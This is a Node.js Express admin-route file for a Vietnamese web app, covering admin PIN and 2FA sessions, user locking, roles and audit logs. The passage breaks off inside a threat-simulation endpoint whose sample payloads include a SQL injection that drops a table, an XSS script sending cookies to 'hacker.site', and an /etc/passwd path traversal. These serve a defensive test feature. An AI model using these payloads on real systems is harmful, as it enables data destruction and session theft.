const express = require("express");
const crypto = require("node:crypto");
const jwt = require("jsonwebtoken");

const JWT_SECRET = String(process.env.JWT_SECRET || "").trim();
if (JWT_SECRET.length < 32) {
  throw new Error("JWT_SECRET is required and must be at least 32 characters");
}

const TRUST_DEVICE_COOKIE_OPTIONS = {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "none",
  path: "/api/admin",
};

const userActivityStore = require("../services/userActivityStore");
const { generateSecret, generateURI, verify } = require("otplib");
const qrcode = require("qrcode");
const {
  ADMIN_FIREBASE_PROJECT_ID,
  getAdminAuth,
} = require("../services/adminFirebase");
const {
  getAdminLocketEmails,
  getAdminLocketUids,
  getLocketAuthVerifier,
} = require("../services/locketAdminVerifier");
const {
  addIpBlacklist,
  checkAdminPinSet,
  clearLoginHistory,
  createAdminSession,
  getGlobalBroadcast,
  getLoginHistory,
  getServerHealthStats,
  getUserPasswordRecoveryStatus,
  getUserRole,
  getWebUser,
  hasActivityDatabase,
  listAuditLogs,
  listBlacklistedIps,
  listReportedContent,
  listWebUsers,
  nukeUserPermanently,
  purgeBotUsers,
  removeIpBlacklist,
  resolveReport,
  revokeUserSessions,
  setAccountStatus,
  setAdminPin,
  setGlobalBroadcast,
  listGlobalBroadcasts,
  toggleGlobalBroadcast,
  deleteGlobalBroadcast,
  setUserRole,
  verifyAdminPin,
  verifyAdminSessionToken,
  writeAudit,
  healIpLocationInDb,
  listWebUserActions,
  clearWebUserActions,
  listSecurityThreats,
  clearSecurityThreats,
  getAdmin2FAInfo,
  setAdmin2FASecret,
  setAdmin2FAEnabled,
  addWhitelist,
  listWhitelist,
  removeWhitelist,
} = require("../services/userActivityStore");
const { getRequestContext, lookupPublicIpLocation } = require("../services/userActivityContext");
const { sendAdminApologyEmail } = require("../services/adminApologyMailer");

const router = express.Router();

async function requireAdmin(req, res, next) {
  const allowedUids = getAdminLocketUids();
  const allowedEmails = getAdminLocketEmails();

  const authorization = req.headers.authorization;
  if (!authorization?.startsWith("Bearer ")) {
    return res.status(401).json({ success: false, code: "UNAUTHORIZED", error: "Unauthorized" });
  }

  try {
    const decodedToken = await getLocketAuthVerifier().verifyIdToken(
      authorization.slice(7),
      false,
    );
    const tokenEmail = String(decodedToken.email || "").trim().toLowerCase();
    
    let role = "user";
    if (hasActivityDatabase()) {
      role = await getUserRole(decodedToken.uid, tokenEmail);
    } else if (allowedUids.has(decodedToken.uid) || allowedEmails.has(tokenEmail)) {
      role = "super_admin";
    }

    if (role === "user" && !allowedUids.has(decodedToken.uid) && !allowedEmails.has(tokenEmail)) {
      return res.status(403).json({
        success: false,
        code: "ADMIN_PERMISSION_REQUIRED",
        error: "Admin permission required",
      });
    }

    if (role === "user") role = "super_admin"; // fallback for bootstrap allowlist

    req.adminUid = decodedToken.uid;
    req.adminEmail = decodedToken.email || null;
    req.adminRole = role;
    req.authTime = decodedToken.auth_time || Math.floor(Date.now() / 1000);
    return next();
  } catch (error) {
    console.warn("Admin Locket token verification failed:", error?.code || error?.name || "unknown");
    return res.status(401).json({ success: false, code: "UNAUTHORIZED", error: "Unauthorized" });
  }
}

function requireActivityDatabase(_req, res, next) {
  if (!hasActivityDatabase()) {
    return res.status(503).json({
      success: false,
      code: "DATABASE_NOT_CONFIGURED",
      error: "User activity database is not configured",
    });
  }
  return next();
}

async function requireActiveAdminSession(req, res, next) {
  // Check short-term token first (30-minute window)
  const sessionToken = req.headers["x-admin-session"];
  if (sessionToken && typeof sessionToken === "string") {
    const hash = crypto.createHash("sha256").update(sessionToken).digest("hex");
    const isValid = await verifyAdminSessionToken(req.adminUid, hash, 30);
    if (isValid) return next();
  }
  
  // Or check if token auth_time is very fresh (< 30 mins)
  const now = Math.floor(Date.now() / 1000);
  if (now - (req.authTime || 0) < 1800) {
    return next();
  }

  return res.status(401).json({
    success: false,
    code: "ADMIN_SESSION_EXPIRED",
    error: "Phiên quản trị nhạy cảm đã hết hạn. Vui lòng xác minh lại mật khẩu.",
  });
}

function isAdminIdentity(uid, email) {
  const normalizedEmail = String(email || "").trim().toLowerCase();
  return getAdminLocketUids().has(uid) || getAdminLocketEmails().has(normalizedEmail);
}

async function isProtectedAdmin(uid) {
  if (getAdminLocketUids().has(uid)) return true;
  const user = await getWebUser(uid);
  if (user && isAdminIdentity(user.uid, user.email)) return true;
  if (hasActivityDatabase()) {
    const role = await getUserRole(uid, user?.email);
    return role === "super_admin";
  }
  return false;
}

async function audit(req, action, targetUid, details, status = "success") {
  try {
    const ctx = getRequestContext(req);
    await writeAudit({
      adminUid: req.adminUid,
      role: req.adminRole || "unknown",
      action,
      targetUid,
      details,
      ipAddress: ctx.ipAddress,
      webSource: ctx.webSource,
      status,
    });
  } catch (error) {
    console.error("Admin audit write failed:", error?.code || error?.name || "unknown");
  }
}

router.use(requireAdmin);

router.get("/verify", async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  let hasPin = false;
  let is2FAEnabled = false;
  if (hasActivityDatabase()) {
    try {
      hasPin = await checkAdminPinSet(req.adminUid);
      const info2fa = await getAdmin2FAInfo(req.adminUid);
      is2FAEnabled = Boolean(info2fa?.is_two_factor_enabled);
    } catch (e) {
      console.warn("Failed to check admin PIN / 2FA status:", e.message);
    }
  }
  return res.status(200).json({
    success: true,
    email: req.adminEmail,
    uid: req.adminUid,
    role: req.adminRole,
    isAdmin: true,
    hasPin,
    is2FAEnabled,
    projectId: ADMIN_FIREBASE_PROJECT_ID,
    activityDatabaseConfigured: hasActivityDatabase(),
  });
});

router.post("/session/create", requireActivityDatabase, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  try {
    const { pin } = req.body || {};
    if (!pin || typeof pin !== "string" || !/^\d{4,8}$/.test(pin.trim())) {
      return res.status(400).json({
        success: false,
        code: "INVALID_PIN_FORMAT",
        error: "Mã PIN bảo mật phải là dãy số gồm từ 4 đến 8 chữ số.",
      });
    }
    const pinStr = pin.trim();
    const alreadySet = await checkAdminPinSet(req.adminUid);
    if (!alreadySet) {
      await setAdminPin(req.adminUid, pinStr, req.adminRole);
      await audit(req, "SETUP_ADMIN_PIN", req.adminUid, "First time admin PIN set");
    } else {
      const isCorrect = await verifyAdminPin(req.adminUid, pinStr);
      if (!isCorrect) {
        await audit(req, "FAILED_ADMIN_PIN", req.adminUid, "Failed PIN verification", "failure");
        return res.status(401).json({
          success: false,
          code: "INVALID_ADMIN_PIN",
          error: "Mã PIN bảo mật không chính xác. Vui lòng thử lại!",
        });
      }
    }

    const info2fa = await getAdmin2FAInfo(req.adminUid);
    let isTrustedDevice = false;
    if (info2fa?.is_two_factor_enabled && info2fa?.two_factor_secret) {
      // Token thiết bị tin cậy chỉ được nhận từ cookie HttpOnly.
      const trustToken = req.cookies?.trust_device_token;
      if (trustToken) {
        try {
          const trustDecoded = jwt.verify(trustToken, JWT_SECRET);
          if (trustDecoded.uid === req.adminUid && trustDecoded.purpose === "TRUSTED_DEVICE") {
            isTrustedDevice = true;
            console.log(`[🟢 Trusted Device] Admin ${req.adminUid} verified via 30-day trusted device token! Skipping 2FA OTP.`);
          }
        } catch (err) {
          // Token hết hạn hoặc không hợp lệ -> bỏ qua và tiếp tục yêu cầu OTP như bình thường
        }
      }

      // Nếu KHÔNG PHẢI thiết bị tin cậy -> Bắt buộc xác thực qua OTP 2FA
      if (!isTrustedDevice) {
        const tempToken = jwt.sign(
          { uid: req.adminUid, purpose: "2FA_PENDING_AUTH", role: req.adminRole },
          JWT_SECRET,
          { expiresIn: "10m" }
        );
        return res.status(200).json({
          success: true,
          require2FA: true,
          tempToken,
          message: "Mã PIN chính xác! Vui lòng nhập mã OTP từ ứng dụng Google Authenticator.",
        });
      }
    }

    const token = crypto.randomBytes(32).toString("hex");
    const hash = crypto.createHash("sha256").update(token).digest("hex");
    await createAdminSession(req.adminUid, hash, 30);
    const auditType = (info2fa?.is_two_factor_enabled && isTrustedDevice) ? "CREATE_ADMIN_SESSION_TRUSTED" : "CREATE_ADMIN_SESSION";
    await audit(req, auditType, req.adminUid, `Started 30-minute privileged admin session via ${auditType}`);
    return res.status(200).json({
      success: true,
      adminSessionToken: token,
      expiresAt: Date.now() + 30 * 60 * 1000,
      role: req.adminRole,
      trustedDeviceUsed: info2fa?.is_two_factor_enabled && isTrustedDevice,
    });
  } catch (error) {
    console.error("Failed to create admin session:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Không thể tạo phiên quản trị" });
  }
});

router.post("/session/verify-2fa", requireActivityDatabase, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  try {
    const { tempToken, otpCode, rememberDevice } = req.body || {};
    if (!tempToken || !otpCode || !/^\d{6}$/.test(String(otpCode).trim())) {
      return res.status(400).json({ success: false, error: "Vui lòng nhập mã OTP gồm đúng 6 chữ số." });
    }
    let decoded;
    try {
      decoded = jwt.verify(tempToken, JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ success: false, error: "Phiên xác thực 2FA tạm thời đã hết hạn. Vui lòng nhập lại PIN!" });
    }
    if (decoded.uid !== req.adminUid || decoded.purpose !== "2FA_PENDING_AUTH") {
      return res.status(403).json({ success: false, error: "Token xác thực 2FA không hợp lệ." });
    }
    const info2fa = await getAdmin2FAInfo(req.adminUid);
    if (!info2fa?.is_two_factor_enabled || !info2fa?.two_factor_secret) {
      return res.status(400).json({ success: false, error: "Tài khoản chưa kích hoạt 2FA." });
    }
    const verification = await verify({
      token: String(otpCode).trim(),
      secret: info2fa.two_factor_secret,
    });
    const isValid = verification && verification.valid === true;
    if (!isValid) {
      await audit(req, "FAILED_ADMIN_2FA_OTP", req.adminUid, "Failed 2FA OTP code test", "failure");
      return res.status(401).json({ success: false, error: "Mã OTP không chính xác hoặc đã hết hạn!" });
    }

    const token = crypto.randomBytes(32).toString("hex");
    const hash = crypto.createHash("sha256").update(token).digest("hex");
    await createAdminSession(req.adminUid, hash, 30);
    await audit(req, "CREATE_ADMIN_SESSION_2FA", req.adminUid, "Started privileged admin session via PIN + 2FA");

    let trustToken = null;
    if (rememberDevice === true || String(rememberDevice) === "true") {
      trustToken = jwt.sign(
        { uid: req.adminUid, purpose: "TRUSTED_DEVICE", role: req.adminRole },
        JWT_SECRET,
        { expiresIn: "30d" }
      );
      res.cookie("trust_device_token", trustToken, {
        ...TRUST_DEVICE_COOKIE_OPTIONS,
        maxAge: 30 * 24 * 60 * 60 * 1000,
      });
      console.log(`[🛡️ Trusted Device] Granted 30-day trust token for Admin: ${req.adminUid}`);
    }

    return res.status(200).json({
      success: true,
      adminSessionToken: token,
      trustedDeviceSet: Boolean(trustToken),
      expiresAt: Date.now() + 30 * 60 * 1000,
      role: req.adminRole,
    });
  } catch (error) {
    console.error("Failed 2FA verification:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Lỗi xác minh mã 2FA" });
  }
});

router.get("/setup-2fa", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  try {
    const info2fa = await getAdmin2FAInfo(req.adminUid);
    let secret = info2fa?.two_factor_secret;
    if (!secret) {
      secret = await generateSecret();
      await setAdmin2FASecret(req.adminUid, secret, false);
    }
    const serviceName = "Huy Locket Admin";
    const userLabel = req.adminEmail || req.adminUid || "Admin";
    const otpauth = await generateURI({ secret, label: userLabel, issuer: serviceName });
    const qrCodeBase64 = await qrcode.toDataURL(otpauth);
    return res.status(200).json({
      success: true,
      qrCode: qrCodeBase64,
      secret: secret,
      is2FAEnabled: Boolean(info2fa?.is_two_factor_enabled),
    });
  } catch (error) {
    console.error("Failed 2FA setup:", error?.message || "unknown", error);
    return res.status(500).json({ success: false, error: error?.message ? `Lỗi khởi tạo bảo mật 2FA: ${error.message}` : "Lỗi khởi tạo bảo mật 2FA" });
  }
});

router.post("/confirm-2fa", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  try {
    const { otpCode } = req.body || {};
    if (!otpCode || !/^\d{6}$/.test(String(otpCode).trim())) {
      return res.status(400).json({ success: false, error: "Vui lòng nhập đúng mã OTP gồm 6 chữ số!" });
    }
    const info2fa = await getAdmin2FAInfo(req.adminUid);
    if (!info2fa?.two_factor_secret) {
      return res.status(400).json({ success: false, error: "Bạn chưa tạo mã QR nào trước đó." });
    }
    const verification = await verify({
      token: String(otpCode).trim(),
      secret: info2fa.two_factor_secret,
    });
    const isValid = verification && verification.valid === true;
    if (!isValid) {
      return res.status(401).json({ success: false, error: "Mã OTP không chính xác hoặc đã hết hạn!" });
    }
    await setAdmin2FAEnabled(req.adminUid, true);
    await audit(req, "ENABLE_ADMIN_2FA", req.adminUid, "Enabled Google Authenticator 2FA for Admin");
    return res.status(200).json({ success: true, message: "🎉 Kích hoạt Bảo Mật 2FA Google Authenticator thành công!" });
  } catch (error) {
    console.error("Failed confirm 2FA:", error?.message || "unknown", error);
    return res.status(500).json({ success: false, error: error?.message ? `Lỗi kích hoạt 2FA: ${error.message}` : "Lỗi kích hoạt bảo mật 2FA" });
  }
});

router.post("/disable-2fa", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  try {
    const { otpCode } = req.body || {};
    if (!otpCode || !/^\d{6}$/.test(String(otpCode).trim())) {
      return res.status(400).json({ success: false, error: "Vui lòng nhập mã OTP 6 số từ Google Authenticator để xác nhận tắt 2FA." });
    }
    const info2fa = await getAdmin2FAInfo(req.adminUid);
    if (!info2fa?.is_two_factor_enabled || !info2fa?.two_factor_secret) {
      return res.status(400).json({ success: false, error: "Tài khoản chưa kích hoạt 2FA." });
    }
    const verification = await verify({
      token: String(otpCode).trim(),
      secret: info2fa.two_factor_secret,
    });
    if (!verification || verification.valid !== true) {
      await audit(req, "FAILED_DISABLE_2FA_OTP", req.adminUid, "Failed OTP verification when trying to disable 2FA", "failure");
      return res.status(401).json({ success: false, error: "Mã OTP không chính xác! Bạn phải nhập đúng mã từ ứng dụng Authenticator để tắt 2FA." });
    }

    await setAdmin2FAEnabled(req.adminUid, false);
    res.clearCookie("trust_device_token", TRUST_DEVICE_COOKIE_OPTIONS);
    await audit(req, "DISABLE_ADMIN_2FA", req.adminUid, "Disabled 2FA protection for Admin (verified via OTP)");
    return res.status(200).json({ success: true, message: "Đã tắt xác thực 2FA và hủy thiết bị tin cậy." });
  } catch (error) {
    console.error("Failed disable 2FA:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Lỗi tắt 2FA" });
  }
});

router.post("/pin/change", requireActivityDatabase, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  try {
    const { oldPin, newPin } = req.body || {};
    if (!oldPin || !newPin) {
      return res.status(400).json({ success: false, error: "Vui lòng nhập đầy đủ mã PIN hiện tại và mới" });
    }
    if (!/^\d{4,8}$/.test(String(newPin).trim())) {
      return res.status(400).json({ success: false, error: "Mã PIN mới phải là dãy số gồm từ 4 đến 8 chữ số" });
    }
    const alreadySet = await checkAdminPinSet(req.adminUid);
    if (alreadySet) {
      const correct = await verifyAdminPin(req.adminUid, String(oldPin).trim());
      if (!correct) {
        return res.status(401).json({ success: false, error: "Mã PIN hiện tại không chính xác!" });
      }
    }
    await setAdminPin(req.adminUid, String(newPin).trim(), req.adminRole);
    await audit(req, "CHANGE_ADMIN_PIN", req.adminUid, "Changed admin numeric PIN");
    return res.status(200).json({ success: true, message: "Đổi mã PIN Quản Trị thành công!" });
  } catch (error) {
    console.error("Failed to change admin PIN:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Lỗi hệ thống khi đổi mã PIN" });
  }
});

router.get("/users", requireActivityDatabase, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  try {
    const requestedLimit = Number.parseInt(req.query.limit, 10);
    const limit = Number.isFinite(requestedLimit)
      ? Math.min(Math.max(requestedLimit, 1), 100)
      : 50;
    const requestedOffset = Number.parseInt(req.query.pageToken, 10);
    const offset = Number.isFinite(requestedOffset) && requestedOffset >= 0
      ? requestedOffset
      : 0;
    const search = String(req.query.search || "").trim();
    const result = await listWebUsers({ search, limit, offset });
    const users = result.users.map((user) => {
      const userRole = user.role || "user";
      return {
        uid: user.uid,
        internalId: user.internal_id,
        email: user.email,
        username: user.username,
        displayName: user.display_name,
        photoURL: user.profile_picture,
        provider: user.auth_provider,
        loginMethod: user.login_method,
        accountStatus: user.account_status,
        disabled: user.account_status === "locked",
        creationTime: user.created_at,
        lastSignInTime: user.last_login_at,
        lastSeenAt: user.last_seen_at,
        lastLogoutAt: user.last_logout_at,
        webSource: user.current_web_source || "unknown",
        activeSessions: user.active_sessions,
        role: userRole,
        isAdmin: userRole === "super_admin" || userRole === "admin" || isAdminIdentity(user.uid, user.email),
        latestLoginData: user.latest_login_event_at ? {
          created_at: user.latest_login_event_at,
          ended_at: user.latest_session_ended_at,
          ip_address: user.ip_address,
          country: user.country,
          region: user.region,
          city: user.city,
          browser: user.browser,
          browser_version: user.browser_version,
          os: user.os,
          device: user.device,
          login_method: user.latest_login_method,
          web_source: user.latest_web_source,
          web_version: user.web_version,
          build_id: user.build_id,
          commit_hash: user.commit_hash,
        } : null,
      };
    });

    const imprecise = ['Không xác định', '', 'Unknown', 'Hanoi', 'Hà Nội', 'Ho Chi Minh City', 'Hồ Chí Minh', 'Ho Chi Minh'];
    await Promise.all(users.map(async (u) => {
      const data = u.latestLoginData;
      if (data && data.ip_address && data.ip_address !== "Không xác định" && data.ip_address !== "Unknown") {
        if (!data.city || imprecise.includes(data.city) || !data.country || data.country === "Không xác định") {
          try {
            const loc = await lookupPublicIpLocation(data.ip_address);
            if (loc && (loc.city !== "Không xác định" || loc.country !== "Không xác định")) {
              data.city = loc.city;
              data.region = loc.region;
              data.country = loc.country;
              healIpLocationInDb(data.ip_address, loc).catch(() => {});
            }
          } catch { /* ignore geo error */ }
        }
      }
    }));

    if (req.query.live !== "1") {
      await audit(req, "LIST_WEB_USERS", null, "Listed verified Huy Locket website users");
    }
    return res.status(200).json({
      success: true,
      users,
      totalUsers: result.total,
      pageToken: result.nextOffset === null ? null : String(result.nextOffset),
      onlineWindowSeconds: result.onlineWindowSeconds,
      historyStartedAt: users.reduce((oldest, user) => {
        const value = user.latestLoginData?.created_at;
        return value && (!oldest || new Date(value) < new Date(oldest)) ? value : oldest;
      }, null),
    });
  } catch (error) {
    console.error("Failed to list website users:", error?.code || error?.name || "unknown");
    return res.status(500).json({
      success: false,
      code: "USER_REGISTRY_QUERY_FAILED",
      error: "Unable to load website users",
    });
  }
});

router.post("/users/purge-bots", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  if (req.adminRole !== "super_admin" && req.adminRole !== "admin") {
    return res.status(403).json({ success: false, error: "Quyền hiện tại không được phép thực hiện thao tác càn quét bot" });
  }
  try {
    const result = await purgeBotUsers(req.adminUid);
    await audit(req, "PURGE_BOT_USERS", null, `Càn quét và khóa ${result.purgedCount} tài khoản Bot/Clone tự động`);
    return res.status(200).json({ success: true, count: result.purgedCount, purgedUsers: result.purgedUsers });
  } catch (error) {
    console.error("Failed to purge bot users:", error?.message || "unknown");
    return res.status(500).json({ success: false, code: "PURGE_BOTS_FAILED", error: `Không thể càn quét bot: ${error?.message || "Lỗi hệ thống"}` });
  }
});

router.get("/users/:uid/login-history", requireActivityDatabase, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  try {
    const requestedLimit = Number.parseInt(req.query.limit, 10);
    const limit = Number.isFinite(requestedLimit)
      ? Math.min(Math.max(requestedLimit, 1), 200)
      : 100;
    const history = await getLoginHistory(req.params.uid, limit);
    const imprecise = ['Không xác định', '', 'Unknown', 'Hanoi', 'Hà Nội', 'Ho Chi Minh City', 'Hồ Chí Minh', 'Ho Chi Minh'];
    await Promise.all(history.map(async (item) => {
      if (item.ip_address && item.ip_address !== "Không xác định" && item.ip_address !== "Unknown") {
        if (!item.city || imprecise.includes(item.city)) {
          try {
            const loc = await lookupPublicIpLocation(item.ip_address);
            if (loc && (loc.city !== "Không xác định" || loc.country !== "Không xác định")) {
              item.city = loc.city;
              item.region = loc.region;
              item.country = loc.country;
              healIpLocationInDb(item.ip_address, loc).catch(() => {});
            }
          } catch { /* ignore */ }
        }
      }
    }));
    await audit(req, "VIEW_LOGIN_HISTORY", req.params.uid, "Viewed website login history");
    return res.status(200).json({ success: true, history });
  } catch (error) {
    console.error("Failed to load login history:", error?.code || error?.name || "unknown");
    return res.status(500).json({
      success: false,
      code: "LOGIN_HISTORY_QUERY_FAILED",
      error: "Unable to load login history",
    });
  }
});

router.delete("/users/:uid/login-history", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  if (req.adminRole !== "super_admin" && req.adminRole !== "admin") {
    return res.status(403).json({ success: false, error: "Quyền Moderator hoặc Support không được xóa lịch sử" });
  }
  try {
    const deleted = await clearLoginHistory(req.params.uid);
    await audit(req, "DELETE_LOGIN_HISTORY", req.params.uid, `Deleted ${deleted} login events`);
    return res.status(200).json({ success: true, deleted });
  } catch (error) {
    console.error("Failed to delete login history:", error?.code || error?.name || "unknown");
    return res.status(500).json({
      success: false,
      code: "LOGIN_HISTORY_DELETE_FAILED",
      error: "Unable to delete login history",
    });
  }
});

router.post("/users/:uid/lock", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  if (req.adminRole !== "super_admin" && req.adminRole !== "admin") {
    return res.status(403).json({ success: false, error: "Quyền hiện tại không được phép khóa tài khoản" });
  }
  if (req.params.uid === req.adminUid) {
    return res.status(403).json({ success: false, error: "Không được tự khóa tài khoản của chính mình" });
  }
  try {
    if (await isProtectedAdmin(req.params.uid)) {
      return res.status(403).json({
        success: false,
        code: "PROTECTED_ADMIN",
        error: "Cannot lock a protected Super Admin account",
      });
    }
    const reason = String(req.body?.reason || "").trim();
    if (!reason) {
      return res.status(400).json({ success: false, error: "Bắt buộc phải nhập lý do khi khóa tài khoản" });
    }
    const updated = await setAccountStatus(req.params.uid, "locked");
    if (!updated) return res.status(404).json({ success: false, code: "USER_NOT_FOUND", error: "User not found" });
    await audit(req, "LOCK_WEB_USER", req.params.uid, `Locked account. Reason: ${reason}`);
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Failed to lock website user:", error?.code || error?.name || "unknown");
    return res.status(500).json({ success: false, code: "LOCK_FAILED", error: "Unable to lock user" });
  }
});

router.post("/users/:uid/unlock", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  if (req.adminRole !== "super_admin" && req.adminRole !== "admin") {
    return res.status(403).json({ success: false, error: "Quyền hiện tại không được phép mở khóa tài khoản" });
  }
  try {
    const reason = String(req.body?.reason || "Mở khóa bởi quản trị viên").trim();
    const updated = await setAccountStatus(req.params.uid, "active");
    if (!updated) return res.status(404).json({ success: false, code: "USER_NOT_FOUND", error: "User not found" });
    await audit(req, "UNLOCK_WEB_USER", req.params.uid, `Unlocked account. Reason: ${reason}`);
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Failed to unlock website user:", error?.code || error?.name || "unknown");
    return res.status(500).json({ success: false, code: "UNLOCK_FAILED", error: "Unable to unlock user" });
  }
});

router.post("/users/:uid/revoke-sessions", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  if (req.adminRole !== "super_admin" && req.adminRole !== "admin") {
    return res.status(403).json({ success: false, error: "Quyền Moderator hoặc Support không được thu hồi phiên" });
  }
  if (req.params.uid === req.adminUid) {
    return res.status(403).json({ success: false, error: "Không được tự thu hồi phiên đang dùng của chính mình" });
  }
  try {
    if (req.adminRole === "admin" && (await isProtectedAdmin(req.params.uid))) {
      return res.status(403).json({ success: false, error: "Admin thường không được thu hồi phiên của Super Admin" });
    }
    const reason = String(req.body?.reason || "").trim();
    if (!reason) {
      return res.status(400).json({ success: false, error: "Bắt buộc nhập lý do khi thu hồi phiên làm việc" });
    }
    const count = await revokeUserSessions(req.params.uid);
    await audit(req, "REVOKE_SESSIONS", req.params.uid, `Revoked ${count} active web sessions. Reason: ${reason}`);
    return res.status(200).json({ success: true, revokedSessions: count });
  } catch (error) {
    console.error("Failed to revoke user sessions:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Không thể thu hồi phiên của người dùng" });
  }
});

router.post("/users/:uid/role", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  if (req.adminRole !== "super_admin") {
    return res.status(403).json({ success: false, error: "Chỉ Super Admin mới được quyền gán hoặc thu hồi vai trò" });
  }
  try {
    const newRole = String(req.body?.role || "").trim().toLowerCase();
    const allowedRoles = ["super_admin", "admin", "moderator", "support", "user"];
    if (!allowedRoles.includes(newRole)) {
      return res.status(400).json({ success: false, error: "Vai trò không hợp lệ" });
    }
    if (await isProtectedAdmin(req.params.uid) || req.params.uid === req.adminUid) {
      return res.status(403).json({ success: false, error: "Tài khoản Super Admin tối thượng hoặc tài khoản của chính bạn được cố định, không thể tự thay đổi vai trò" });
    }
    const reason = String(req.body?.reason || "").trim();
    if (!reason && newRole !== "user") {
      return res.status(400).json({ success: false, error: "Bắt buộc nhập lý do khi thay đổi vai trò quản trị" });
    }
    await setUserRole(req.params.uid, newRole, req.adminUid);
    await audit(req, "ASSIGN_ROLE", req.params.uid, `Assigned role '${newRole}'. Reason: ${reason || "Revoked to standard user"}`);
    return res.status(200).json({ success: true, role: newRole });
  } catch (error) {
    console.error("Failed to assign role:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Không thể gán vai trò người dùng" });
  }
});

router.get("/audit-logs", requireActivityDatabase, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  if (req.adminRole !== "super_admin" && req.adminRole !== "admin") {
    return res.status(403).json({ success: false, error: "Chỉ Super Admin hoặc Admin mới được xem Nhật ký quản trị" });
  }
  try {
    const limit = Math.min(Math.max(Number.parseInt(req.query.limit, 10) || 100, 1), 200);
    const offset = Math.max(Number.parseInt(req.query.offset, 10) || 0, 0);
    const action = String(req.query.action || "").trim();
    const adminUid = String(req.query.adminUid || "").trim();
    const result = await listAuditLogs({ action, adminUid, limit, offset });
    return res.status(200).json({ success: true, logs: result.logs, total: result.total });
  } catch (error) {
    console.error("Failed to list audit logs:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Không thể tải nhật ký quản trị" });
  }
});

router.get("/user-actions", requireActivityDatabase, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  try {
    const limit = Math.min(Math.max(Number.parseInt(req.query.limit, 10) || 150, 1), 300);
    const offset = Math.max(Number.parseInt(req.query.offset, 10) || 0, 0);
    const search = String(req.query.search || "").trim();
    const actionType = String(req.query.actionType || "").trim();
    const uid = String(req.query.uid || "").trim();
    
    const result = await listWebUserActions({ uid, actionType, search, limit, offset });
    return res.status(200).json({ success: true, actions: result.actions, total: result.total });
  } catch (error) {
    console.error("Failed to list user actions:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Không thể tải nhật ký hoạt động người dùng" });
  }
});

router.delete("/user-actions", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  try {
    const uid = String(req.query.uid || "").trim() || null;
    await clearWebUserActions(uid);
    await audit(req, "CLEAR_USER_ACTIONS", uid || "ALL", `Cleared user activity action logs for ${uid || "ALL"}`);
    return res.status(200).json({ success: true, message: "Đã xóa lịch sử hoạt động thành công!" });
  } catch (error) {
    console.error("Failed to clear user actions:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Lỗi khi xóa lịch sử hoạt động" });
  }
});

router.get("/security-threats", requireActivityDatabase, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  try {
    const limit = Math.min(Math.max(Number.parseInt(req.query.limit, 10) || 150, 1), 300);
    const offset = Math.max(Number.parseInt(req.query.offset, 10) || 0, 0);
    const search = String(req.query.search || "").trim();
    const threatType = String(req.query.threatType || "").trim();
    const severity = String(req.query.severity || "").trim();

    const result = await listSecurityThreats({ threatType, severity, search, limit, offset });
    return res.status(200).json({ success: true, threats: result.threats, total: result.total });
  } catch (error) {
    console.error("Failed to list security threats:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Không thể tải dữ liệu cảnh báo tường lửa bảo mật" });
  }
});

router.post("/security-threats/simulate-test", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  try {
    const { threatType = "SQL_INJECTION" } = req.body;
    const ip = req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.socket?.remoteAddress || "127.0.0.1";
    let details = "Phát hiện tải trọng tấn công thử nghiệm từ Admin Pen-Test Sandbox";
    let severity = "CRITICAL";
    let sample = "' OR 1=1; DROP TABLE users; --";

    if (threatType === "XSS_INJECTION") {
      sample = "<script>fetch('http://hacker.site?cookie='+document.cookie)</script>";
      details = "Phát hiện mã độc XSS cố gắng đánh cắp phiên đăng nhập và Token";
      severity = "CRITICAL";
    } else if (threatType === "DDOS_RATE_FLOOD") {
      sample = "GET /api/moment/feed x350 requests / 10s";
      details = "Tần suất truy cập bất thường lặp đi lặp lại từ một nguồn IP (>300 req/phút)";
      severity = "HIGH";
    } else if (threatType === "AUTOMATED_SCRAPER_BOT") {
      sample = "User-Agent: python-requests/2.31.0 Scraper-Bot";
      details = "Robot cào dữ liệu tự động bị hệ thống tường lửa bẻ khóa và chặn tải xuống";
      severity = "MEDIUM";
    } else if (threatType === "PATH_TRAVERSAL") {
      sample = "GET /../../../../etc/passwd";
